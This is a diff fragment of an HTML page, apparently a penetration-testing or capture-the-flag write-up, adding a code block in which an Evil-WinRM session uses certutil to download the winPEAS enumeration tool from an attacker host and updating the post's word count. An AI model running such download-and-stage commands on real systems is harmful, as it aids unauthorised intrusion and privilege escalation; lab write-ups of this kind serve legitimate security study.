+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; certutil.exe -urlcache -split -f <span style="color:#e6db74">&#34;http://10.10.16.155:8000/winPEASx64.exe&#34;</span> .
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">000000</span>  ...
+</span></span><span style="display:flex;"><span>  9b3200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
 </span></span></code></pre></div>
       </div>
     </article>
@@ -376,7 +438,7 @@ ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        656 Words
+        857 Words
       </p>
 
       <p>
